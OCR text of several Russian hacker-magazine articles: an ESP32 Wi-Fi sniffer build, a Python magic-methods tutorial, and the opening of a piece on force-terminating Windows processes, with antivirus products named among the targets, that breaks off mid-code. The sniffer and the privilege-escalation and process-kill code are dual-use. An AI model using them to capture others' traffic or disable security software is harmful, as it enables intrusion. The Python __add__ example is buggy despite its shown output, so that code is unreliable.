  А вот так выглядит процесс агрегации для A‐MPDU.





В слу чае шифрования есть существенное отличие — каждый MPDU шифрует‐
ся отдельно. Также не стоит забывать, что все MPDU, входящие в A‐MPDU,
должны иметь один и тот же адрес получателя.
  Тем же, кто хочет разобраться глуб же/детальнее с 802.11, могу рекомен‐
довать пару ресурсов (помимо самого стандарта IEEE 802.11). Первым делом
посоветую прочитать My CWAP Study Notes, а в качестве дополнения этот
ресурс. Не стоит забывать и про книги:
 • CWAP Certiﬁed Wireless Analysis Professional Oﬃcial Study Guide Exam PW0‐
   270;
 • CWAN Certiﬁed Wireless Network Administrator Oﬃcial Study Guide Exam
   PW0‐105.



                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

    ВАЯЕМ СНИФФЕР
              ESP32           НА
             СЛУШАЕМ ВАЙФАЙ, ПРИЦЕЛИВАЕМСЯ
                                  НА БЛЮТУС!





УРА, ПРАКТИКА!
Надеюсь, ты прор вался через тонкости и нюансы 802.11 без потери мозговой
ткани и нер вных клеток и готов к созданию аппаратного сниффера. Поехали!
Начнем, как всегда, с постанов ки задачи.


Что мы хотим?
 1. Пер во‐наперво мы желаем простое подключение к компу/ноуту — то есть
   USB. Кек, Ethernet/LAN есть не у всех ноутов; да и не каждая Wi‐Fi‐карточка
   позволит переключить ее в «неразборчивый режим» (promiscuous mode).
  Список сетевых карточек, которые можно переключить в нераз борчивый
   режим, есть тут.
 2. Второе — возможность динамически переключать номер канала, где
   прослушиваем трафик. Хотим гибкий фильтр входящих пакетов. Да‐да,
   чтобы слушать только Control Frame или только Data Frame, c определен‐
  ным MAC‐ или IP‐адре сом.
 3. Реализация начального этапа анализа пакетов: если пришел законченный
   пакет — отправ ляем его на комп, но если это фрагментированный пакет
   или часть агрегированного пакета, то дождаться при хода остальных час‐
   тей, собрать его до полного и только потом отдавать на комп.
 4. Естественно, хотим, чтобы wireshark мог отображать в режиме реального
   времени прос лушанный трафик.
 5. Еще одно абсолютно естественное пожелание: если ты знаешь пароль
   от Wi‐Fi‐сетки, которую ты прослушиваешь, то хорошо бы иметь magic‐
  функцию вида decrypt_message(* ptr_message, *WPA_WPA2_key) ,
   результатом которой будут расшифрованные данные для последующего
   анализа.

В отличие от ESP8266, EPS32 имеет кон фигури руемый аппаратный буфер
для приема и отправки фрей ма 802.11. Мы можем менять количество
буферов, при этом размер каждого буфера 1600 байт, что уже достаточно
для приема кадра. Из своих эксперимен тов я выяснил, что 1600 байт хватает
для прослушива ния Wi‐Fi‐сети. Однако надо иметь в виду важную особен‐
ность — ESP32 (точнее, драйвер, предоставляемый в SDK) в неразборчивом
режиме под держивает следующие типы фреймов:
 • 802.11 Management frame;
 • 802.11 Data frame, including MPDU, AMPDU, AMSDU, etc;
 • 802.11 MIMO frame, for MIMO frame, the sniﬀer only dumps the length of the
   frame.

И не под держи вает:
 • 802.11 Control frame;
 • 802.11 error frame, such as the frame with a CRC error, etc.

Но если ты вни мательно про читал вводную часть о том, как устроен Wi‐Fi, то
ты поймешь, что в том, что в ESP32 нет full stack фреймов, нет особен ной
печали: помимо того что можно слушать приходящие фрей мы, есть воз‐
можность и отправ лять некоторые данные. Для это го существу ет функция es‐
p_wiﬁ_80211_tx. Но тут тоже есть нюансы — пока есть возможность отправлять
только beacon/probe request/probe response/action and non‐QoS data frame.
   Теперь нем ного кода, который осуществляет захват Wi‐Fi.


wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
wifi_country_t wifi_country = {
  .cc="CN",
  .schan=1,
  .nchan=13,
  .policy=WIFI_COUNTRY_POLICY_AUTO
};
nvs_flash_init();
tcpip_adapter_init();
ESP_ERROR_CHECK(esp_event_loop_init(event_handler, NULL));
ESP_ERROR_CHECK(esp_wifi_init(&cfg));
ESP_ERROR_CHECK(esp_wifi_set_country(&wifi_country));
ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
ESP_ERROR_CHECK(esp_wifi_start());
ESP_ERROR_CHECK(esp_wifi_set_channel(WIFI_CHANNEL, WIFI_SECOND_CHA
N_NONE));
ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&sniffer_wifi));

Поскольку работа с ESP32 осуществляется с помощью SDK, сначала про‐
изводим ини циализацию Wi‐Fi «по фэншую». Последней строчкой указыва ем
функцию, которая будет вызываться при захвате нового фрей ма.
  Поскольку я работаю с ESP32‐PICO‐KIT V4, то из коробки дан ную отла доч‐
ную плату можно подклю чить к USB через переход ник UART — USB на чипе
CP2102. Соответственно, нуж на инициализация UART.


uart_config_t uart_cfg = {
  .baud_rate = UART_2_PC_BAUD_RATE,
  .data_bits = UART_DATA_8_BITS,
  .parity    = UART_PARITY_DISABLE,
  .stop_bits = UART_STOP_BITS_1,
  .flow_ctrl = UART_HW_FLOWCTRL_DISABLE
};
ESP_ERROR_CHECK(uart_param_config(UART_2_PC, &uart_cfg));
ESP_ERROR_CHECK(uart_set_pin(UART_2_PC,
  UART_PIN_NO_CHANGE,
  UART_PIN_NO_CHANGE,
  UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
ESP_ERROR_CHECK(uart_driver_install(UART_NUM_0, 4096, 0, 0, NULL, 0))
;

Тип пакетов для отлова можно задавать через филь тр:


wifi_promiscuous_filter_t filter = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
};
ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));

Полный список пакетов, которые можно фильтровать:


// filter all packets
#define WIFI_PROMIS_FILTER_MASK_ALL           (0xFFFFFFFF)
// filter the packets with type of WIFI_PKT_MGMT
#define WIFI_PROMIS_FILTER_MASK_MGMT          (1)
// filter the packets with type of WIFI_PKT_CTRL
#define WIFI_PROMIS_FILTER_MASK_CTRL          (1<<1)
// filter the packets with type of WIFI_PKT_DATA
#define WIFI_PROMIS_FILTER_MASK_DATA          (1<<2)
// filter the packets with type of WIFI_PKT_MISC
#define WIFI_PROMIS_FILTER_MASK_MISC          (1<<3)
// filter the MPDU which is a kind of WIFI_PKT_DATA
#define WIFI_PROMIS_FILTER_MASK_DATA_MPDU     (1<<4)
// filter the AMPDU which is a kind of WIFI_PKT_DATA
#define WIFI_PROMIS_FILTER_MASK_DATA_AMPDU    (1<<5)
// filter all control packets
#define WIFI_PROMIS_CTRL_FILTER_MASK_ALL      (0xFF800000)
// filter the control packets with subtype of Control Wrapper
#define WIFI_PROMIS_CTRL_FILTER_MASK_WRAPPER  (1<<23)
// filter the control packets with subtype of Block Ack Request
#define WIFI_PROMIS_CTRL_FILTER_MASK_BAR      (1<<24)
// filter the control packets with subtype of Block Ack
#define WIFI_PROMIS_CTRL_FILTER_MASK_BA       (1<<25)
// filter the control packets with subtype of PS‐Poll
#define WIFI_PROMIS_CTRL_FILTER_MASK_PSPOLL   (1<<26)
// filter the control packets with subtype of RTS
#define WIFI_PROMIS_CTRL_FILTER_MASK_RTS      (1<<27)
// filter the control packets with subtype of CTS
#define WIFI_PROMIS_CTRL_FILTER_MASK_CTS      (1<<28)
// filter the control packets with subtype of ACK
#define WIFI_PROMIS_CTRL_FILTER_MASK_ACK      (1<<29)
// filter the control packets with subtype of CF‐END
#define WIFI_PROMIS_CTRL_FILTER_MASK_CFEND    (1<<30)
// filter the control packets with subtype of CF‐END+CF‐ACK
#define WIFI_PROMIS_CTRL_FILTER_MASK_CFENDACK (1<<31)

Находится он в файле esp_wifi_types.h.


Эпис толяр ный жанр
Написал большущее письмо в support Espressif на тему расширения функци‐
ональности SDK в части Wi‐Fi: чтобы была возможность приема и отправ ки
фреймов 802.11 без каких‐либо ограничений. Обещали подумать и включить
в план раз работ ки. Так что, уважаемый читатель, если ты тоже хочешь, чтобы
ESP32 полноценно поддерживал при ем и отправку всех фреймов 802.11,
имел на борту хотя бы USB 2.0, начал поддерживать 5 ГГц и получил magic_‐
function, которая при наличии пароля  от  Wi‐Fi будет расшифровывать
полученные данные, то не поленись зайти в вет ку форума What would you like
to see in The Next Chip? и выразить свои пожелания. Возможно, у тебя появят‐
ся еще классные идеи относительно того, что бы ты хотел видеть в сле‐
дующем поколении ESP32, — не стесняйся об этом писать.


Также в этом фай ле, помимо deﬁne для филь тров, есть полезная структура:


wifi_pkt_rx_ctrl_t:
typedef struct {
  // Received Signal Strength Indicator(RSSI) of packet. unit: dBm
  signed rssi:8;
  // PHY rate encoding of the packet. Only valid for non HT(11bg)
packet
  unsigned rate:5;
  unsigned :1; // reserve
  unsigned sig_mode:2; // 0: non HT(11bg) packet; 1: HT(11n) packet;
3: VHT(11ac) packet
  unsigned :16; // reserve
  // Modulation Coding Scheme. If is HT(11n) packet, shows the modula
tion, range from 0 to 76(MSC0 ~ MCS76)
  unsigned mcs:7;
  // Channel Bandwidth of the packet. 0: 20MHz; 1: 40MHz
  unsigned cwb:1;
  unsigned :16; // reserve
  unsigned smoothing:1; // reserve
  unsigned not_sounding:1; // reserve
  unsigned :1; // reserve
  // Aggregation. 0: MPDU packet; 1: AMPDU packet
  unsigned aggregation:1;
  // Space Time Block Code(STBC). 0: non STBC packet; 1: STBC packet
  unsigned stbc:2;
  // Flag is set for 11n packets which are LDPC
  unsigned fec_coding:1;
  // Short Guide Interval(SGI). 0: Long GI; 1: Short GI
  unsigned sgi:1;
  // noise floor of Radio Frequency Module(RF). unit: 0.25dBm
  signed noise_floor:8;
  // ampdu cnt
  unsigned ampdu_cnt:8;
  // primary channel on which this packet is received
  unsigned channel:4;
  // secondary channel on which this packet is received. 0: none; 1:
above; 2: below
  unsigned secondary_channel:4
  unsigned :8; // reserve
  // timestamp. The local time when this packet is received. It is
precise only if modem sleep or light sleep is not enabled. unit:
microsecond
  unsigned timestamp:32;
  unsigned :32; // reserve
  unsigned :31; // reserve
  // antenna number from which this packet is received. 0: WiFi
antenna 0; 1: WiFi antenna 1
  unsigned ant:1;
  // length of packet including Frame Check Sequence(FCS)
  unsigned sig_len:12;
  unsigned :12; // reserve
  // state of the packet. 0: no error; others: error numbers which
are not public
  unsigned rx_state:8;
} wifi_pkt_rx_ctrl_t;

Данная структура доступна всякий раз, когда срабатывает callback, сиг‐
нализирующий о том, что новый фрейм дос тупен. Как видишь, он содержит
много полезной информа ции, которую можно использовать при обработ ке
пакетов.
  Возможно, дотошный читатель скажет: «Как же так — мы прослушива ем
Wi‐Fi, а там скорости могут быть 600 Мбит/с для 802.11n, а связь с компом
у нас осу ществля ется через скромный UART, который может работать
на стандартных 115 200, что явно ниже скорости Wi‐Fi. Где‐то тут подвох!»
В чем‐то ты будешь прав, но позволь ска зать нес колько «но» и поделиться
своими наб людени ями.
 • Во‐первых, как показа ла практика, отладочная плата прекрасно работала
   на скорости 921 600 бод.
 • Во‐вторых, если преобразова тель UART — USB заменить на более новую
   микросхему CP2102N, то скорость можно будет поднять до 3 Мбод.
 • В‐третьих, Espressif официально ответила, что ESP32 может работать: «The
  UART interface of ESP32 can work on 5Mbps band rate».
 • В‐четвертых, мы можем нас троить фильтр так, чтобы ловились не все
   пакеты.

В итоге в ходе экспериментов удавалось на некоторое вре мя получить неп‐
рерывный dataﬂow. Но тут не обошлось без «ложки дег тя в бочке меда». Отла‐
дочная плата греется. Яичницу на ней, конечно, не пожарить, одна ко и холод‐
ной назвать ее нельзя. Но не забываем, что стоимость такой отла доч ной пла‐
ты составляет порядка десяти долларов.


ПРОВЕРКА БОЕМ
На одной из ESP32 была разверну та точ ка доступа с простым веб‐сер вером.
На начальном этапе шиф рование я отключил. Ноутбуком подключаюсь к этой
точке доступа и начинаю пинговать. На второй ESP32 запус каю сниффер.





Как результат работы сниффера видим такой пакет.





Разберем теперь немного байтики:



  MAC HEADER → FC:           88 02
  MAC HEADER → Duration/ID   30 00
  MAC HEADER → Address1 11 22 33 44 55 66
  MAC HEADER → Address2      AA BB CC DD EE FF
  MAC HEADER → Address3      AA BB CC DD EE FF
  MAC HEADER → SEQUENCE CTRL 90 2F
  MAC HEADER → QOS           00 00


Далее у нас в игру вступает LLC & SNAP Header: AA AA 03 00 00 00 08 00.
Причем надеюсь, начиная с 08 00 в заголовке LLC & SNAP, ты уже узнаешь
одну из нужных команд, которая называется ping. Последние четыре байта —
это контрольная сумма.


Бла годар ности
Спасибо коллеге, который, узнав о моем проекте, помог подогнать отладоч‐
ную плату на основе СС3220SF — CC3220SF‐LAUNCHXL. С одной сто роны,
данный  микроконтроллер  не  блещет  производительностью —  скром‐
ные 80 МГц Cortex‐M4 (против 240 МГц Xtensa LX6 C), а ОЗУ у TI всего
лишь 256 Кбайт против 520 Кбайт у ESP32. Но дальше следует одно интерес‐
ное «но» — согласно этой wiki, мы можем перевести ее в неразборчивый
режим, который позволит как принимать все фреймы 802.11, так и отправлять
raw‐пакет, такой, как нам захочется.
  Помимо такой гиб кости приема/отправки 802.11, у пла ты, на мой взгляд,
достаточно гибкая сис тема филь тра ции входящих пакетов:





То есть здесь можно организовать что‐то в этом роде (раздел 10.3.2
«CC3120, CC3220 SimpleLinkTM Wi‐Fi ® and Internet of Things Network Proces‐
sor Programmer’s Guide»):
 • Receive WLAN data broadcast frames only from two speciﬁc MAC addresses.
 • Do not receive WLAN unicast frames from a certain SRC_IP address range.
 •  If a unicast frame is received from MAC address AA.BB.CC.DD.EE.FF , in‐
   crease counter_1.
 •  If a unicast frame is received from MAC address CC.HH.II.JJ.KK.LL , in‐
   crease counter_2.
 •  If a unicast UDP frame is received from MAC address AA.BB.CC.DD.EE.FF
   or CC.HH.II.JJ.KK.LL , pass only packets from port 5001.




В КАЧЕСТВЕ ЗАКЛЮЧЕНИЯ
Разумеется, этим проектом я не совершил револю цию и мес тами даже изоб‐
рел велосипед, ведь подобные снифферы на основе ESP32 уже существу‐
ют — например, ArduinoPcap, ESP32‐WiFi‐Sniﬀer или проект самой Espressif.
Но лично мне все нравит ся. :) «Пусть расцветают сто цветов, пусть сопер‐
ничают сто школ», тем более что в каждой реализации есть свои недочеты,
а имея свое устройство, ты можешь настроить его полностью на свой вкус,
под свои цели и задачи.


        WWW

                     За текущим сос тоянием проекта можно  наб‐
                      людать тут.
КОДИНГ
PYTHON
 ПО ВСЕМ ПРАВИЛАМ

   ДЕЛАЕМ СВОЮ СТРУКТУРУ ДАННЫХ
   СОВМЕСТИМОЙ С ФИЧАМИ PYTHON





Если ты пишешь на Python, то наверняка
видел в стандартных библиотеках опре‐
деления методов, обер нутых в двой ные
подчеркивания. Эти «магические» методы
образуют мно гие из полезных интерфей‐         Даниил Батурин                                                                                   Координатор проекта VyOS
сов, которы ми ты пос тоян но поль зуешь‐        (https://vyos.io),функциональщик,«языковед»,иногда
ся, — например, когда получаешь зна чение        сетевойdaniil@baturin.orgадминистратор.
по номеру элемента или выводишь что‐то
через  print. Эти методы можно и нужно
исполь зовать и в своих программах. Как —
сейчас покажу.


Вообще, любой хорошо спроектированный язык опре деляет набор сог‐
лашений и применяет их в сво ей стандартной библиотеке. Соглашения могут
касаться как чисто внешних приз наков, вро де синтаксиса названий (Camel‐
Case, snake_case), так и поведения объектов. Язык Python в этом смысле —
весьма последовательный.
  Синтаксис в Python нерасширяем, но зато интерфейсы взаимодействия
между объекта ми хорошо определены и доступны любому разработчику.
В отличие от Java в Python нет формальной концепции интерфейсов клас са,
любой класс может предоставлять любой интерфейс, достаточно определить
методы с нужными именами и аргументами и убедиться, что их поведение
соответствует ожидаемому.


             INFO

                      Везде в статье речь идет о Python 3. Python
                         2.7 уже можно счи тать мертвым.



ИНТЕРФЕЙСЫ В PYTHON
Поскольку Python динамичес ки типизирован, проверить соответствие класса
объекта на этапе компиляции невозможно. Возможности для указания анно‐
таций типов из Python 3.5 предназна чены прежде всего для внеш них ста‐
тических анализа торов и не используются во время выполнения. Явная про‐
верка класса с помощью type() считается дурным тоном.
  В крайнем случае можно использовать isinstance() — в отличие
от type() эта функция возвращает True не только для самого класса, но и
для всех его потомков. Проверка с помощью type() сломается при нас‐
ледовании, именно поэто му люди к ней так пло хо относятся.
  Интерфейсы объектов определяются  так называемыми магическими
методами. По соглашению их имена окру жаются двойным подчеркиванием.
Метод __init__(), который слу жит конструктором клас са, — пример, извес‐
тный каж дому. Почти каждая стандартная операция, включая форматирован‐
ный вывод и арифметику, реализуется каким‐то магичес ким способом.


        WWW

                     Полное   опи сание   стандартных   магичес ких
                      методов можно найти в разделе докумен тации
                        Data Model.


Для демонс трации мы напишем примитивную и медленную реализацию ассо‐
циативного мас сива на осно ве списка из кортежей, «идентичную натураль‐
ной» в смысле интерфейса.


ДЕЛАЕМ СВОЙ АССОЦИАТИВНЫЙ МАССИВ
Реализация будет очень простой — связный список из пар «ключ — зна‐
чение». Например, эквивалент ассоциативного массива {1: 2, 3: 4} будет
[(1,  2),  (3,  4)]. Она значительно медленнее встроенной: например,
поиск зна чения элемента по ключу будет требовать O(n) операций, в то время
как встро енная требует O(1). Для демонстрации, впрочем, вполне сойдет.
  Свой класс мы назовем Assoc. Определим класс и его конструктор:


class Assoc(object):
    def __init__(self, contents=[]):
        self._contents = contents

Для удобс тва тес тирования мы сделали, чтобы начальное значение мож но
было передать в конструкторе, вро де Assoc([(1,2), (3,4)]).
   Теперь приступим к магии! Будем счи тать, что код мы сохранили в файл
assoc.py.


ДОБАВЛЯЕМ СТРОКОВЫЕ ПРЕДСТАВЛЕНИЯ
В Python существуют два разных метода для получе ния стро кового представ‐
ления объ ектов: __repr__ и __str__. Различие между ними довольно тонкое,
но сущес твенное: __repr__, по замыслу, должен выдавать допустимое
выражение Python, с помощью которого можно создать такой же объект.
Это не всег да возможно, поэтому на практике у многих объектов он возвра‐
щает просто что‐то такое, что позволяет разработчику идентифицировать
объект, вроде <Foo object at 0x7f94fe2f22e8>. Имен но он вызывается,
если ввес ти имя переменной в интерактивном интерпретаторе.
  Метод __str__ предназна чен для вывода человекочитаемых данных. Его
вызывают print и format, если он есть у объекта. Если его нет, они тоже
обращаются к __repr__. Вызвать эти методы вручную можно с помощью фун‐
кций str() и repr() соответственно.
  В нашем случае вполне возможно выдать как машинное, так и человекочи‐
таемое пред ставление. Добавим в наш класс сле дующие методы:


def __repr__(self):
    return "Assoc({0})".format(self._contents)
def __str__(self):
    contents_string = ", ".join(map(lambda x: "{0}: {1}".format(repr(
x[0]), repr(x[1])), self._contents))
    return "{{{0}}}".format(contents_string)

Теперь протестируем наши функции:


>>> from assoc import *
>>> a = Assoc([("foo", 1), ("bar", 2)])
>>> a
Assoc([('foo', 1), ('bar', 2)])
>>> print(a)
{foo: 1, bar: 2}
>>> print("My dict: {0}".format(a))
My dict: {foo: 1, bar: 2}


ДЛИНА И ЛОГИЧЕСКОЕ ПРЕДСТАВЛЕНИЕ
Для определения длины структуры данных применяется метод __len__.
Добавим в наш класс следующий тривиальный метод:


def __len__(self):
    return len(self._contents)

Убедимся, что он работает как ожидалось:


>>> len(Assoc([(1,2), (2,3)]))
2
>>> len(Assoc())
0

Мы привыкли, что любое значение в Python можно исполь зовать в условном
операторе. По соглашению пустые структуры данных (пустая стро ка, пус той
список и так далее) в логическом контексте экви валентны False. В общем
случае Python преобразует объект в логичес кое значение с помощью метода
__bool__.
   Если метод __bool__ не определен, объект считается эквивалентным
True. Мы мог ли бы легко определить его, например:


def __bool__(self):
    return (True if self._contents != [] else False)

Можно написать даже просто return  bool(self._contents), пользуясь
тем, что внут ри это список и его пус тота и так отлично определяется функци‐
ей bool().
  Но мы вос пользуем ся особым случаем и совместим два метода в одном.
Дело в том, что если у объ екта есть метод __len__, но нет метода __bool__,
то сначала вызывается __len__, и если он возвращает ноль, то значение объ‐
екта считается ложным. Убедимся в этом на практике:


>>> "Non‐empty" if Assoc([1,2]) else "Empty"
'Non‐empty'
>>> "Non‐empty" if Assoc() else "Empty"
'Empty'


РАБОТАЕМ С ИНДЕКСАМИ ЭЛЕМЕНТОВ
Поиск и прис воение значений элемен там по индексу тоже не являются осо‐
бой возможностью встроенных струк тур данных, а реализуются магическими
методами, и каждый может опре делить их сам. Эти методы — __getitem__
и __setitem__.
   Начнем с получения элементов по индексу. Поскольку наш словарь —
просто связный список, мы вос пользуем ся встроенной функцией filter().
Если она вернет пустой спи сок, мы будем считать, что такого элемента нет,
и вызовем исключение KeyError, такое же, какое выдает встроенный ассо‐
циативный мас сив.


def __getitem__(self, key):
    items = list(filter(lambda x: x[0] == key, self._contents))
    if not items:
        raise KeyError(key)
    else:
        return items[0][1]

Присвоение зна чений по индексам нем ного сложнее, пос кольку мы не можем
напрямую обратиться к элемен ту по ключу. Мы сна чала найдем индекс нуж‐
ного элемента в спис ке, если он там есть, и перезапишем его. Если его там
нет, мы просто добавим новую пару к списку.


def __setitem__(self, key, value):
    index = 0
    found = False
    for i in self._contents:
        if i[0] == key:
            found = True
            break
        else:
            index += 1
    if found:
        self._contents[index] = (key, value)
    else:
        self._contents.append((key, value))

Убедимся, что все работа ет:


>>> a = Assoc([("foo", 1), ("bar", 2)])
>>> a["bar"]
2
>>> a["bar"] = 3
>>> print(a)
{'foo': 1, 'bar': 3}


РАБОТАЕМ С ЦИКЛАМИ И ПРОВЕРЯЕМ ПРИНАДЛЕЖНОСТЬ
МАССИВУ
В текущем виде наш ассоциативный массив нель зя исполь зовать в циклах —
у него еще нет соответствующего интерфейса. Для это го нуж но добавить
метод __iter__. Документация говорит, что для ассоциатив ных мас сивов
(mapping types) ите рация идет по ключам.
  Метод __iter__ дол жен возвращать объект‐итератор с методом __nex‐
t__(), который вызывает исключение StopIteration, если эле ментов
не осталось. Такой объект можно создать с помощью yield, но мы не будем
создавать свой. Извлечь клю чи из нашего списка кортежей проще всего
с помощью map(), а объект map и так является итератором:


def __iter__(self):
    return map(lambda x: x[0], self._contents)

Проверим на практике:


>>> a = Assoc([("foo", 1), ("bar", 2)])
>>> for k in a:
...     print(a[k])
...
1
2

Для проверки при над лежности элемента массиву мы могли бы опре делить
метод __contains__(self, item). Но и здесь стандартная библиоте ка пре‐
доставляет нам возможность срезать углы: если у объекта есть метод
__iter__, но нет __contains__, то оператор in проверит наличие элемента
в том объекте‐итераторе, который вер нет __iter__.


>>> "foo" in a
True


ДОБАВЛЯЕМ АРИФМЕТИЧЕСКИЕ ОПЕРАЦИИ
Встроенные ассо циативные массивы в Python не поддерживают оператор +,
но нас это не оста новит. Сложение у нас будет озна чать слияние массивов.
При сов падении ключей новое значение будем брать из правого массива.
   Чтобы воспроизвести поведе ние обычных арифметических операций,
которые не модифицируют свои аргументы, нам потребуется создать копию
нашего массива. Добавим import copy в заголовок модуля.
  Поскольку оба аргумента должны быть ассоциативными мас сивами, здесь
будет уместно ограничить тип операндов и вызывать исключение, если типы
несовместимы. Мы ограничим тип нашим собственным классом Assoc
и встроенным dict, посколь ку их интерфей сы совместимы.
   Теперь добавим в наш класс магический метод __add__.


def __add__(self, other):
    if (not isinstance(other, dict)) or (not isinstance(other, Assoc
)):
        raise TypeError("Cannot merge an Assoc with {0}".format(type(
other)))
    tmp = copy.copy(self)
    for k in other:
        tmp[k] = other[k]
    return tmp

Убедимся, что все работа ет.


>>> a = Assoc([("foo", 1), ("bar", 2)])
>>> b = Assoc([("foo", 3), ("baz", 4)])
>>> print(a + b)
{'foo': 3, 'bar': 2, 'baz': 4}


ЗАКЛЮЧЕНИЕ
Как видишь, от автора библиотеки тре буется не так много усилий, чтобы сде‐
лать ее поведе ние совместимым со стан дартной библиотекой и упростить
пользователям жизнь. Мы рас смотрели только небольшую часть интерфей‐
сов, но теперь ты знаешь, на что обращать внимание и что искать.
КОДИНГ
  УБИТЬ
 БИЛЛА

         ИЗУЧАЕМ СПОСОБЫ
    ПРИНУДИТЕЛЬНОГО ЗАВЕРШЕНИЯ
       ПРОЦЕССОВ В WINDOWS





                                                 Nik Zerof
                                                 xtahi0nix@gmail.com





При написа нии софта, вза имо дей ству ющего с дру гими при‐
ложениями, порой  возникает необходимость завер шить
выполнение сто рон них процессов. Есть несколь ко методов,
которые могут помочь в этом деле: одни хорошо докумен‐
тирова ны, другие пыта ются завершить нуж ные процессы
более жес тки ми спо собами, провоцируя операционную сис‐
тему прихлопнуть их силой. Я покажу нес колько способов
завершения и разрушения про цессов в Windows.


В качестве «подопытных кроликов» возь мем бра узер Firefox, антивирусный
комплекс ESET NOD32 Smart Security и программа защиты от 0day‐угроз Hit‐
manPro.Alert, которые будут работать в Windows 10 LTSB 1809. Все приложе‐
ния последних версий, скачаны с официальных сайтов и трудят ся на полную
мощность — хоть некоторые и в пробных режимах. Разрядность как ОС, так
и приложений будет x64.


ПОДГОТОВКА
Работать мы будем с процессами и потока ми, поэтому сначала нужно
написать необходимые вспо мога тельные функции. Кроме того, нам понадо‐
бится фун кция, повышающая наши привилегии в системе до отладочных
(SE_DEBUG_NAME). Получать мы их будем стандартным образом, используя
функции OpenProcessToken и LookupPrivilegeValue.


             INFO

                    Во всех экспериментах я использовал свою собс‐
                        твенную  библиотеку  для  работы  с  WinAPI
                      по хешам имен API‐функций, так что, вероятно,
                        это пов лияло на взаимодействие с защитными
                     решениями. Каким образом она была написа на,
                      подробно  рассказывалось  в  статье  «Тайный
                         WinAPI. Как обфусцировать вызовы WinAPI в сво‐
                    ем приложении».



BOOL set_privileges(LPCTSTR szPrivName)
{
    TOKEN_PRIVILEGES token_priv = { 0 };
    HANDLE hToken = 0;
    token_priv.PrivilegeCount = 1;
    token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PR
IVILEGES, &hToken))
    {
#ifdef DEBUG
        std::cout << "OpenProcessToken error: " << GetLastError() <<
std::endl;
#endif
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, szPrivName, &token_priv.Privil
eges[0].Luid))
    {
#ifdef DEBUG
        std::cout << "LookupPrivilegeValue error: " << GetLastError()
 << std::endl;
#endif
        CloseHandle(hToken);
        return FALSE;
    }
    if (!AdjustTokenPrivileges(hToken, FALSE, &token_priv, sizeof(
token_priv), NULL, NULL))
    {
#ifdef DEBUG
        std::cout << "AdjustTokenPrivileges error: " << GetLastError(
) << std::endl;
#endif
        CloseHandle(hToken);
        return FALSE;
    }

Для получения отладочных привилегий вызовем эту функцию таким образом:


if (set_privileges(SE_DEBUG_NAME))
        printf("SE_DEBUG_NAME is granted! \n");

Для своего лич ного удобства работу с процессами я разделил на две фун‐
кции: одна будет получать PID по имени про цесса, другая — получать хендл
процесса по его PID. Конечно, можно было бы сделать большую функцию,
которая сразу бы давала хендл процесса по име ни, но это не всегда удобно,
потому что порой требуется просто получить только PID.


             INFO

                        PID (process identiﬁer) — это иден тификатор про‐
                      цесса,    который   выступает    контейнером
                       для потоков. В свою очередь, у потоков тоже есть
                      идентификатор, который называется TID (thread
                              identiﬁer). Зная PID и TID, мож но получить их хен‐
                        длы, чтобы потом работать с потоками и процес‐
                       сами.


Идентификатор процесса мы получим при помощи функций CreateTool‐
help32Snapshot (соз дадим снимок активных процессов в сис теме), далее
будем переби рать и сравнивать процессы с нужным именем, функциями Pro‐
cess32First и Process32Next.


DWORD get_pid_from_name(IN const char * pProcName)
{
    HANDLE snapshot_proc = CreateToolhelp32Snapshot(TH32CS_SNAPPROC
ESS, 0);
    if (snapshot_proc == INVALID_HANDLE_VALUE)
    {
#ifdef DEBUG
        std::cout << "CreateToolhelp32Snapshot error: " << GetLas
tError() << std::endl;
#endif
        return 0;
    }
    PROCESSENTRY32 ProcessEntry;
    DWORD pid;
    ProcessEntry.dwSize = sizeof(ProcessEntry);
    if (Process32First(snapshot_proc, &ProcessEntry))
    {
        while (Process32Next(snapshot_proc, &ProcessEntry))
        {
            if (!stricmp(ProcessEntry.szExeFile, pProcName))
            {
                pid = ProcessEntry.th32ProcessID;
                CloseHandle(snapshot_proc);
                return pid;
            }
        }
    }
    CloseHandle(snapshot_proc);
    return 0;
}


             INFO

                     Процессы можно перечислять и другими метода‐
                       ми, например использовать для этого функцию
                        Process  Status  Helper  (PSAPI) K32EnumPro‐
                   cesses или недоку ментированную функцию Zw‐
                   QuerySystemInformation. Чтобы про качать
                       свой скилл работы с Windows, ты можешь самос‐
                        тоятельно реали зовать эти методы и посмотреть,
                         как они работают.


Чтобы получить PID про цес са ﬁrefox.exe, функцию надо вызвать таким обра‐
зом:


DWORD firefox_pid = get_pid_from_name("firefox.exe");

Осталась малень кая функция получения хендла. Обрати внимание: она поз‐
воляет задать пра ва доступа к нужному процессу.


HANDLE get_process_handle(IN DWORD pid, DWORD access)
{
    HANDLE hProcess = OpenProcess(access, FALSE, pid);
    if (!hProcess)
    {
#ifdef DEBUG
        std::cout << "OpenProcess error: " << GetLastError() << std::
endl;
#endif
        return FALSE;
    }
    return hProcess;
}

Если функция отрабаты вает успешно, она возвращает хендл процесса, если
нет — FALSE. Вызывается она таким образом:


HANDLE hFirefox = get_process_handle(firefox_pid, PROCESS_ALL_ACCESS)
;

В примере выше мы получаем хендл с пра вами PROCESS_ALL_ACCESS.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
        УБИТЬ БИЛЛА
            ИЗУЧАЕМ СПОСОБЫ ПРИНУДИТЕЛЬНОГО
             ЗАВЕРШЕНИЯ ПРОЦЕССОВ В WINDOWS





СПОСОБЫ ЗАВЕРШЕНИЯ ПРОЦЕССОВ
Сначала поработаем с процессами, а потом с потока ми. Я буду писать
маленькие функции, которые демонстрируют при менение различных методов
для завер шения процессов и потоков. Обрати внимание — использовать
будем толь ко необходимые права дос тупа для процессов, потому что не каж‐
дый процесс позволит открыть себя с правами PROCESS_ALL_ACCESS, осо‐
бенно это касается защитных решений.
  Думаю, пер вое, что приходит в голову, — это применить фун кцию NtTer‐
minateProcess.


BOOL kill_proc1(IN DWORD pid)
{
